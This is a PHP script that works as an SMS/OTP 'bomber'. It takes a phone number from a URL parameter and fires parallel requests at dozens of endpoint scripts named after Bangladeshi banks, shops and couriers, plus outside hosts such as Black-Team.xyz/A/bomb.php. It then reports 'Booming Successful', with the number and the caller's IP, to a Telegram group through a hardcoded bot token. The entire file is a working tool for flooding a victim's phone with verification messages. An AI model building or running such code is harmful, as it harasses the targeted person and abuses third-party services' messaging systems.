<?php
// Define the phone number passed as a parameter
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Telegram Bot Configuration
$botToken = "7558656717:AAGW7w5sFbXOwJkEs_XMR56jAaefktR7O68";
$telegramGroup = "@bctsms";

// List of URLs
$urls = [
    "toybox.php?phone=",
    "busbdlogin.php?phone=",
    "aibl.php?phone=",
        "toybox.php?phone=",
    "busbdlogin.php?phone=",
    "aibl.php?phone=",
    "betonbook.php?phone=",
    "daktarbhai.php?phone=",
    "dhakabank.php?phone=",
    "doctime.php?phone=",
    "win2gain.php?phone=",
    "easy.com.bd.php?phone=",
    "chainaonline.php?phone=",
    "talikhata.php?phone=",
    "fsibl.php?phone=",
    "fundesh.php?phone=",
    "quizgiri.php?phone=",
    "kirebd.php?phone=",
    "kabbik.php?phone=",
    "ghuri.php?phone=",
    "mojaenglish.php?phone=",
    "redx.php?phone=",
    "obhai.php?phone=",
    "gpshop.php?phone=",
    "sundarban.php?phone=",
    "cineplex.php?phone=",
    "ousodhpotro.php?phone=",
    "bdtikets.php?phone=",
    "ecuriar.php?phone=",
    "mokam.php?phone=",
    "stedfast.php?phone=",
    "sebaxyz.php?phone=",
    "portpos.php?phone=",
    "jatri.php?phone=",
    "thebodyshop.php?phone=",
 "https://rafixt.my.id/bot/100api.php?phone=",   
 "https://rafixt.my.id/bot/100api.php?phone=",
  "https://rafixt.my.id/bot/100api.php?phone=",
  
  "gpay.php?phone=",
  
  "mygp.php?phone=",
  
  "quizgiri.php?phone=",
  
  "sebaxyz.php?phone=",
  
  "http://Black-Team.xyz/A/bomb.php?phone=", 
    
    // Add other URLs as needed
];

// Function to send a message to Telegram
function sendToTelegram($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $options = [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => $data,
    ];

    $ch = curl_init();
    curl_setopt_array($ch, $options);
    curl_exec($ch);
    curl_close($ch);
}

// Check if the phone number is provided
if (!empty($phone)) {
    $mh = curl_multi_init(); // Initialize cURL multi handle
    $curlHandles = []; // Array to hold cURL handles

    // Initialize cURL handles for each URL
    foreach ($urls as $url) {
        $fullUrl = $url . urlencode($phone);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $fullUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Set a timeout for each request
        curl_multi_add_handle($mh, $ch); // Add handle to multi handle
        $curlHandles[] = $ch; // Store the handle for later
    }

    // Execute all queries simultaneously
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        usleep(100000); // Sleep for 100 milliseconds to avoid high CPU usage
    } while ($running > 0);

    // Collect responses and remove handles
    foreach ($curlHandles as $ch) {
        $response = curl_multi_getcontent($ch);
        // Optionally, you can log or check the response here
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh); // Close the multi handle

    // Prepare the Telegram message
    $time = date("Y-m-d H:i:s");
    $ip = $_SERVER['REMOTE_ADDR'];
    $telegramMessage = "Booming Successful\nPhone: $phone\nTime: $time\nIP: $ip";

    // Send the message to the Telegram group
    sendToTelegram($botToken, $telegramGroup, $telegramMessage);

    // Return success response in JSON format
    $responseData = [
        'status' => 'success',
        'message' => 'Booming successful ',
    ];

    header('Content-Type: application/json');
    echo json_encode($responseData);
} else {
    // If phone is not provided, return an error
    $errorData = [
        'status' => 'error',
        'message' => 'Phone number is required'
    ];

    header('Content-Type: application/json');
    echo json_encode($errorData);
}
?>